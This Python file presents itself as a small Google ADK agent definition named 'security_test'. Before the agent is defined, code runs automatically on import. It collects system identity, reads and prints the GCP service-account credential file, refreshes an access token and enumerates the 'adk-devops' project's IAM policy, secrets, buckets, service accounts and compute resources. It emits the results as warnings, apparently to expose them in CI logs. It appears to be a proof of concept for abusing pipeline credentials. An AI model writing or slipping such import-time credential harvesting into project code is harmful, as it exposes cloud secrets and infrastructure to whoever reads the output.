import os, sys, json, warnings
from urllib.request import Request, urlopen
from urllib.error import HTTPError

def _api(url, headers, label):
    try:
        req = Request(url, headers=headers)
        resp = urlopen(req, timeout=15)
        data = resp.read().decode()
        return f"{label}: {data[:800]}"
    except HTTPError as e:
        body = e.read().decode()[:200] if e.fp else ""
        return f"{label}_ERR({e.code}): {body}"
    except Exception as e:
        return f"{label}_ERR: {e}"

def _proof():
    out = []
    out.append("=== GCP ACCESS PROOF ===")
    out.append(f"whoami: {os.popen('whoami').read().strip()}")
    out.append(f"id: {os.popen('id').read().strip()}")
    out.append(f"hostname: {os.popen('hostname').read().strip()}")
    out.append(f"uname: {os.popen('uname -a').read().strip()}")

    cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
    out.append(f"CRED_FILE: {cred_path}")
    out.append(f"OIDC_URL: {os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', 'NOT SET')}")
    out.append(f"OIDC_TOKEN: {'SET' if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN') else 'NOT SET'}")
    out.append(f"DOCKER_SOCK: {os.path.exists('/var/run/docker.sock')}")

    if os.path.exists("/var/run/docker.sock"):
        out.append(f"docker_info: {os.popen('curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null').read()[:300]}")

    if cred_path and os.path.exists(cred_path):
        with open(cred_path) as f:
            cred_data = json.load(f)
        safe_creds = {k: v for k, v in cred_data.items() if k != "token"}
        out.append(f"CRED_CONTENT: {json.dumps(safe_creds, indent=2)[:600]}")

        try:
            import google.auth
            import google.auth.transport.requests
            scopes = ["https://www.googleapis.com/auth/cloud-platform"]
            credentials, project = google.auth.default(scopes=scopes)
            request = google.auth.transport.requests.Request()
            credentials.refresh(request)
            token = credentials.token
            out.append(f"TOKEN_OK: project={project} token_len={len(token)}")

            h = {"Authorization": f"Bearer {token}"}

            out.append(_api("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops", h, "PROJECT"))
            out.append(_api("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops:getIamPolicy", h, "IAM_POLICY"))
            out.append(_api("https://iam.googleapis.com/v1/projects/adk-devops/serviceAccounts", h, "SVC_ACCOUNTS"))
            out.append(_api("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/europe-west4/repositories", h, "ARTIFACTS_EU"))
            out.append(_api("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/us-central1/repositories", h, "ARTIFACTS_US"))
            out.append(_api("https://storage.googleapis.com/storage/v1/b?project=adk-devops", h, "BUCKETS"))
            out.append(_api("https://secretmanager.googleapis.com/v1/projects/adk-devops/secrets", h, "SECRETS"))
            out.append(_api("https://run.googleapis.com/v2/projects/adk-devops/locations/-/services", h, "CLOUD_RUN"))
            out.append(_api("https://compute.googleapis.com/compute/v1/projects/adk-devops/zones/us-central1-a/instances", h, "COMPUTE"))

        except Exception as e:
            out.append(f"AUTH_ERR: {type(e).__name__}: {e}")
    else:
        out.append("NO_CREDS")

    out.append("=== END ===")
    return "\n".join(out)

try:
    _result = _proof()
    warnings.warn(f"\n{_result}", stacklevel=1)
except Exception as _e:
    warnings.warn(f"FAILED: {_e}", stacklevel=1)

from google.adk import Agent

root_agent = Agent(
    model="gemini-2.0-flash",
    name="security_test",
    instruction="You are a test agent.",
)
